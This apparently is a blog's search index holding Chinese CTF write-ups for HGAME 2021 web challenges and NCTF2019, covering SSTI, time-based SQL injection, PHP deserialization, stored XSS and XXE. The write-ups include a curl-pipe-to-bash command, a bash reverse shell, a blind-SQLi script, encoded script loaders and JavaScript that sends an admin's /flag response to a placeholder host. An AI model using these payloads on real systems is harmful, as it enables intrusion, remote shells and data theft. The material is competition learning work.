<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>HGAME</title>
      <link href="HGAME%202021%20week3-web/"/>
      <url>HGAME%202021%20week3-web/</url>
      
        <content type="html"><![CDATA[<h2 id="Level-Week3"><a href="#Level-Week3" class="headerlink" title="Level - Week3"></a>Level - Week3</h2><h3 id="Forgetful"><a href="#Forgetful" class="headerlink" title="Forgetful"></a>Forgetful</h3><p>考点：简单python-SSTI</p><p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210214230828.png" alt="img"></p><p>题目是一个记事本，添加描述的时候存在SSTI，在查看页面可以看到SSTI已经成功了：</p><p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210214230954.png" alt="image-20210214230953251"></p><p>最为常规的payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[].__class__.__mro__[1].__subclasses__()&#125;&#125;</span><br><span class="line">&#123;&#123;[].__class__.__mro__[1].__subclasses__()[167].__init__.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;ls &#x2F;&#39;).read()&#125;&#125;</span><br><span class="line">&#123;&#123;[].__class__.__mro__[1].__subclasses__()[167].__init__.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;curl ip|bash&#39;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>因为命令执行处有waf，所以可以选择直接弹shell：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 8888</span><br><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;8888 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>姿势还是比较常规；</p><p>分享一个从<code>[].__class__.__mro__[1].__subclasses__()</code>查找模块位置的脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#python 3</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">[回显内容]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span> = re.split(<span class="string">&#x27;,&#x27;</span>, <span class="built_in">str</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(<span class="built_in">list</span>)):</span><br><span class="line">      <span class="keyword">if</span> <span class="string">&#x27;catch_warnings&#x27;</span> <span class="keyword">in</span> <span class="built_in">list</span>[i]:</span><br><span class="line">            print(i)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="iki-Jail"><a href="#iki-Jail" class="headerlink" title="iki-Jail"></a>iki-Jail</h3><p>考点：MySQL注入，单引号逃逸</p><p>熟悉的登录框，熟悉的sql注入</p><p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210215130850.png" alt="image-20210215130849132"></p><p>发现用户字段必须要邮箱才可以，而且如果开了Burp抓包之后会出现一些问题，导致Ajax不能工作。</p><p>于是直接使用bp对<code>login.php</code>发包；</p><p>进行了简单的fuzz，过滤如下：</p><p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210215131112.png" alt="image-20210215131110567"></p><p>由单双引号过滤想到了<code>\</code>逃逸单引号，当我们用户名输入<code>admin\</code>的时候，语句变成了：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> <span class="keyword">user</span> <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;admin\&#x27;</span> <span class="keyword">AND</span> password<span class="operator">=</span><span class="string">&#x27;xxx&#x27;</span></span><br></pre></td></tr></table></figure><p>那么<code>xxx</code>就变成了sql语句执行，造成了注入；</p><p>结果发现只能延时注入：</p><p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210215131035.png" alt="image-20210215131033385"></p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#python3,wh1sper</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">host = <span class="string">&#x27;https://jailbreak.liki.link/login.php&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mid</span>(<span class="params">bot, top</span>):</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">int</span>)(<span class="number">0.5</span>*(top+bot))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">transToHex</span>(<span class="params">flag</span>):</span></span><br><span class="line">    res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">        res += <span class="built_in">hex</span>(<span class="built_in">ord</span>(i))</span><br><span class="line">    res = <span class="string">&#x27;0x&#x27;</span> + res.replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sqli</span>():</span></span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">200</span>):</span><br><span class="line">        top = <span class="number">126</span></span><br><span class="line">        bot = <span class="number">32</span></span><br><span class="line">        <span class="keyword">while</span> top &gt; bot:</span><br><span class="line">            babyselect = <span class="string">&#x27;(database())&#x27;</span><span class="comment">#week3sqli</span></span><br><span class="line">            babyselect = <span class="string">&quot;(select group_concat(table_name) from information_schema.TABLES where table_schema like database())&quot;</span><span class="comment">#u5ers</span></span><br><span class="line">            babyselect = <span class="string">&quot;(select group_concat(column_name) from information_schema.columns where table_name like 0x7535657273)&quot;</span><span class="comment">#usern@me,p@ssword</span></span><br><span class="line">            babyselect = <span class="string">&quot;(select `p@ssword` from week3sqli.u5ers)&quot;</span><span class="comment">#sOme7hiNgseCretw4sHidd3n</span></span><br><span class="line">            babyselect = <span class="string">&quot;(select `usern@me` from week3sqli.u5ers)&quot;</span><span class="comment">#admin</span></span><br><span class="line">            payload = <span class="string">&quot;^(if((ascii(substr(&#123;&#125;,&#123;&#125;,1))&gt;&#123;&#125;),1,sleep(2)))#&quot;</span>.<span class="built_in">format</span>(babyselect, j, mid(bot, top))</span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin\\&quot;</span>,</span><br><span class="line">                <span class="string">&quot;password&quot;</span>: payload.replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;/**/&#x27;</span>)</span><br><span class="line">                <span class="comment">#^(if((ascii(1)&gt;55),sleep(3),sleep(3)))#这个确实延时成功了</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                start = time.time()</span><br><span class="line">                r = requests.post(url=host, data=data)</span><br><span class="line">                print(data)</span><br><span class="line">                print(time.time()-start)</span><br><span class="line">                <span class="keyword">if</span> time.time()-start &lt; <span class="number">1.5</span>:</span><br><span class="line">                    bot = mid(bot, top) + <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    top = mid(bot, top)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        name += <span class="built_in">chr</span>(top)</span><br><span class="line">        print(name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    sqli()</span><br><span class="line">    <span class="comment">#hgame&#123;7imeB4se_injeCti0n+hiDe~th3^5ecRets&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>hgame{7imeB4se_injeCti0n+hiDe~th3^5ecRets}</p><h3 id="Arknights"><a href="#Arknights" class="headerlink" title="Arknights"></a>Arknights</h3><p>考点：PHP反序列化</p><p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210215121944.png" alt="image-20210215121933780"></p><p>题目是一个类似于抽卡的网站，描述里面说”r4u用git部署到了自己的服务器上”，那么自然而然Githack把源码hack下来。</p><p><a href="https://github.com/Anthem-whisper/CTFWEB_sourcecode/raw/main/HGAME2021/%5BHGAME2021%5DArknights.zip">source.zip</a></p><p>在<code>simulator.php</code>我们可以看到有很多类，其中第146行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Eeeeeeevallllllll</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>=<span class="string">&quot;坏坏liki到此一游&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;msg;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有一个echo操作，那么我们全局搜索<code>__toString</code>。第93行：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CardsPool</span></span>&#123;</span><br><span class="line">    ……</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>pop链很明确，就看如何触发反序列化了。</p><p>第137行<code>Session::extract()</code>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">extract</span>(<span class="params"><span class="variable">$session</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$sess_array</span> = explode(<span class="string">&quot;.&quot;</span>, <span class="variable">$session</span>);</span><br><span class="line">        <span class="variable">$data</span> = base64_decode(<span class="variable">$sess_array</span>[<span class="number">0</span>]);</span><br><span class="line">        <span class="variable">$sign</span> = base64_decode(<span class="variable">$sess_array</span>[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$sign</span> === md5(<span class="variable">$data</span> . <span class="built_in">self</span>::secret_key))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;sessiondata = unserialize(<span class="variable">$data</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;sessiondata);</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;go away! you hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>他会把session的<code>.</code>前面的内容反序列化，并且会做一个加盐的判断，但是密钥在103行已经给了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> SECRET_KEY = <span class="string">&quot;7tH1PKviC9ncELTA1fPysf6NYq7z7IA9&quot;</span>;</span><br></pre></td></tr></table></figure><p>那么我们可以编写一个exp：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Eeeeeeevallllllll</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span> = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CardsPool</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cards</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$pop</span> = <span class="keyword">new</span> Eeeeeeevallllllll();</span><br><span class="line"><span class="variable">$pop</span>-&gt;msg = <span class="keyword">new</span> CardsPool();</span><br><span class="line"><span class="comment">//echo serialize($pop);</span></span><br><span class="line"><span class="variable">$key</span> = <span class="string">&quot;7tH1PKviC9ncELTA1fPysf6NYq7z7IA9&quot;</span>;</span><br><span class="line"><span class="variable">$sign</span> = md5(serialize(<span class="variable">$pop</span>).<span class="variable">$key</span>);</span><br><span class="line"><span class="variable">$payload</span> = base64_encode(serialize(<span class="variable">$pop</span>)).<span class="string">&#x27;.&#x27;</span>.base64_encode(<span class="variable">$sign</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$payload</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">$sess_array = explode(&quot;.&quot;, $payload);</span></span><br><span class="line"><span class="comment">$data = base64_decode($sess_array[0]);</span></span><br><span class="line"><span class="comment">echo $data,&quot;\n&quot;;</span></span><br><span class="line"><span class="comment">$sign = base64_decode($sess_array[1]);</span></span><br><span class="line"><span class="comment">echo $sign,&quot;\n&quot;;</span></span><br><span class="line"><span class="comment">if($sign === md5($data . $key))&#123;</span></span><br><span class="line"><span class="comment">    unserialize($data);</span></span><br><span class="line"><span class="comment">&#125;else&#123;</span></span><br><span class="line"><span class="comment">    echo $sign;</span></span><br><span class="line"><span class="comment">    die(&quot;go away! you hacker!&quot;);</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>发送session即可得到flag</p><p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210215130724.png" alt="image-20210215130722662"></p><h3 id="Post-to-zuckonit2-0"><a href="#Post-to-zuckonit2-0" class="headerlink" title="Post to zuckonit2.0"></a>Post to zuckonit2.0</h3><p>考点：XSS</p><p>网站是一个创建笔记的站点，存在XSS漏洞</p><p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210216130625.png" alt="image-20210216130624020"></p><p>在<code>/static/www.zip</code>给了源码：<a href="https://github.com/Anthem-whisper/CTFWEB_sourcecode/raw/main/HGAME2021/%5BHGAME2021%5DPost_to_zuckonit2.0.zip">source.zip</a></p><p>和week2的XSS比起来多一个功能，可以替换批量字符串，并且在<code>/preview</code>查看替换的结果</p><p>审计源码，在添加留言的存在一个waf：</p><p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210216125153.png" alt="image-20210216125152416"></p><p>跟进函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">escape_index</span>(<span class="params">original</span>):</span></span><br><span class="line">    content = original</span><br><span class="line">    content_iframe = re.sub(<span class="string">r&quot;^(&lt;?/?iframe)\s+.*?(src=[\&quot;&#x27;][a-zA-Z/]&#123;1,8&#125;[\&quot;&#x27;]).*?(&gt;?)$&quot;</span>, <span class="string">r&quot;\1 \2 \3&quot;</span>, content)<span class="comment">#只留src属性</span></span><br><span class="line">    <span class="keyword">if</span> content_iframe != content <span class="keyword">or</span> re.match(<span class="string">r&quot;^(&lt;?/?iframe)\s+(src=[\&quot;&#x27;][a-zA-Z/]&#123;1,8&#125;[\&quot;&#x27;])$&quot;</span>, content):</span><br><span class="line">        <span class="keyword">return</span> content_iframe</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        content = re.sub(<span class="string">r&quot;&lt;*/?(.*?)&gt;?&quot;</span>, <span class="string">r&quot;\1&quot;</span>, content)</span><br><span class="line">        <span class="keyword">return</span> content</span><br></pre></td></tr></table></figure><p>可以看到只允许我们添加类似于<code>&lt;iframe scr=&quot;xxx&quot;&gt;</code>的标签，并且<code>xxx</code>限制在1-8位，显然没办法直接执行JS。</p><p>不过我们可以添加<code>&lt;iframe scr=&quot;/preview &quot;&gt;</code>来使得index能直接看到<code>/preview</code>页面：</p><p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210216124755.png" alt="image-20210216124754639"></p><p>再通过字符串替换功能，把<code>xxx</code>换成<code>javascript:xxxxx</code>，形成<code>&lt;iframe src=&#39;javascript:alter(1)&#39;&gt;</code>即可XSS</p><p>payload：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:<span class="built_in">document</span>.write(atob(<span class="string">&#x27;PHNjcmlwdCBzcmM9Imh0dHA6Ly9pcC9teWpzL2Nvb2tpZS5qcyI+PC9zY3JpcHQ+&#x27;</span>));</span><br></pre></td></tr></table></figure><p>小手一抖，cookie到手：</p><p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210216124700.png" alt="image-20210216124651414"></p><p>hgame{simple_csp_bypass&amp;a_small_mistake_on_the_replace_function}</p><h3 id="Post-to-zuckonit-another-version"><a href="#Post-to-zuckonit-another-version" class="headerlink" title="Post to zuckonit another version"></a>Post to zuckonit another version</h3><p>考点：XSS，HttpOnly绕过</p><p>说是绕<code>HttpOnly</code>，实则并没有绕；</p><p>相比于上一道XSS：</p><ol><li><p>增加了HttpOnly，使得我们直接用js不能直接获取到本地cookie；</p><p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210220173620.png" alt="image-20210220173619352"></p></li><li><p>修改了功能，把直接替换字符串换成了查找字符串</p><p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210220173858.png" alt="image-20210220173856459"></p></li></ol><p>依然在<code>static/www.zip</code>给出了源码：<a href="https://github.com/Anthem-whisper/CTFWEB_sourcecode/raw/main/HGAME2021/%5BHGAME2021%5DPost_to_zuckonit2.0_another_version.zip">source.zip</a></p><p>源码大同小异，甚至连waf都没变，单独在字符串替换功能上修改为正则匹配并且在两端加<code>&lt;b&gt;</code>标签，得到高亮效果</p><p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210220174349.png" alt="image-20210220174348492"></p><p>如果按照正常思维来查找’a’字符串的话，效果就如下图：</p><p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210220174512.png" alt="image-20210220174510622"></p><p>但是我们应当注意到，这个高亮实际上还是由<code>String.prototype.replace()</code>方法来进行<strong>正则替换</strong>的，那么我们如果输入<code>.*</code>之类的关键词进行高亮就会出现意想不到的效果：<br><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210220174753.png" alt="image-20210220174752450"></p><p>没错，因为正则替换让我们得以有机可乘</p><p>思路还是一样，先利用替换构造好XSS，再利用<code>&lt;iframe src=&#39;/preview&#39;&gt;</code>来触发0-click</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src&#x3D;&#39;&#x2F;preview&#39;&gt;</span><br><span class="line">&lt;iframe src&#x3D;&#39;AAA&#39; &gt;</span><br></pre></td></tr></table></figure><p>替换的payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AAA(&#39;srcdoc&#x3D;&#39;&lt;img src&#x3D;1 onerror&#x3D;document.write(atob(&amp;#x27;PHNjcmlwdCBzcmM9Imh0dHA6Ly9pcC9teWpzL0J5cGFzc19IVFRQX09ubHkuanMiPjwvc2NyaXB0Pg&#x3D;&#x3D;&amp;#x27;));&gt;&#39;)*</span><br></pre></td></tr></table></figure><p>替换之后其实是这样：</p><p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210220175915.png" alt="image-20210220175913943"></p><p>实际上是利用了iframe标签的srcdoc属性和HTML实体编码来绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src&#x3D;&quot;&lt;b class&#x3D;&quot;search_result&quot;&gt;AAA(&quot; srcdoc&#x3D;&quot;&lt;img src&#x3D;1 onerror&#x3D;document.write(atob(&#39;PHNjcmlwdCBzcmM9Imh0dHA6Ly9pcC9teWpzL0J5cGFzc19IVFRQX09ubHkuanMiPjwvc2NyaXB0Pg&#x3D;&#x3D;&#39;));&gt;&quot; )*&lt;&#x3D;&quot;&quot; b&#x3D;&quot;&quot;&gt;&#39; &gt;&lt;&#x2F;iframe&gt;</span><br></pre></td></tr></table></figure><p>结果一目了然；</p><p>而iframe里面<code>&lt;script&gt;</code>指向的JS：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">xmlhttp = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line"><span class="comment">//是否能跨域</span></span><br><span class="line">xmlhttp.withCredentials = <span class="literal">true</span>;</span><br><span class="line">xmlhttp.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (xmlhttp.readyState == <span class="number">4</span>) &#123;</span><br><span class="line">        location.href = <span class="string">&#x27;http://ip/?cookie=&#x27;</span> + btoa(xmlhttp.responseText)</span><br><span class="line">        <span class="comment">//得用btoa()进行base64编码，不然flag会很神必</span></span><br><span class="line">        <span class="comment">//尝试getAllResponseHeaders()不行，因为HttpOnly的Set-Cookie头不适用</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//设置连接信息</span></span><br><span class="line"><span class="comment">//第一个参数表示http的请求方式，支持所有http的请求方式，主要使用get和post</span></span><br><span class="line"><span class="comment">//第二个参数表示请求的url地址，get方式请求的参数也在url中</span></span><br><span class="line"><span class="comment">//第三个参数表示采用异步还是同步方式交互，true表示异步</span></span><br><span class="line">xmlhttp.open(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;/flag&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="comment">//4.发送数据，开始和服务器端进行交互</span></span><br><span class="line"><span class="comment">//同步方式下，send这句话会在服务器段数据回来后才执行完</span></span><br><span class="line"><span class="comment">//异步方式下，send这句话会立即完成执行</span></span><br><span class="line">xmlhttp.send(<span class="string">&#x27;&#x27;</span>);</span><br></pre></td></tr></table></figure><p>不能绕HttpOnly来获取cookie，但是我们可以直接让admin请求<code>/flag</code>，把responseText发给我们就行了；</p><p>这个是本地打的结果：</p><p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210220172735.png" alt="image-20210220172727362"></p><p>大手一抖，flag到手：</p><p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210220175431.png" alt="image-20210220175430475"></p><p>因为flag里面出题人故意放了<code>&amp;</code>字符让我们踩坑，打出来的responseText需要base64编码。</p><p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210220175441.png" alt="image-20210220172930232"></p><p>下面这个才对。</p><p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210220175445.png" alt="image-20210220173313149"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="NCTF2019_Fakexml/"/>
      <url>NCTF2019_Fakexml/</url>
      
        <content type="html"><![CDATA[<p>NCTF2019web1:fake xml cookbook_writeup</p><p>By:0xfxxker_wh1sper</p><p>解题思路：</p><p>这道题名字是XML，关于XML我知道的只有两种手段，一是普通XML注入，通过闭合各种标签然后植入恶意代码运行脚本，但是一般这种手段实在攻击者能够掌握password字段并且能够保存到服务器当中去才能够添加一个新的admin账户（当时也在这里卡了很久），还有一种就是XXE(XML External Entity Injection) 全称为 XML 外部实体注入，利用点是外部实体，如果能注入，外部实体并且成功解析的话，这就会大大拓宽我们 XML 注入的攻击面（这可能就是为什么单独说 而没有说 XML 注入的原因吧，或许普通的 XML 注入真的太鸡肋了，现实中几乎用不到）。</p><p>用户名，密码随便试一下：</p><p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120164837.png" alt="img"></p><p>抓包，分析:</p><p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120164848.png" alt="img"></p><p>于是我构造了如下XML外部实体，大概是这样</p><p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120164909.png" alt="img"></p><p>注意事项：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE dy（这里有一个空格） [</span><br><span class="line">&lt;!ENTITY dy SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;dy;（分号）&lt;&#x2F;username&gt;&lt;password&gt;123&lt;&#x2F;password&gt;&lt;&#x2F;user&gt;</span><br></pre></td></tr></table></figure><p>通过POST请求发过去</p><p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120164914.png" alt="img"></p><p>服务器说登录失败，并且返回&amp;dy，也就是/flag的内容</p><p>这里挂一篇关于xxe的学习文档：<a href="http://url.cn/54Ucm5w">http://url.cn/54Ucm5w</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="hello-world/"/>
      <url>hello-world/</url>
      
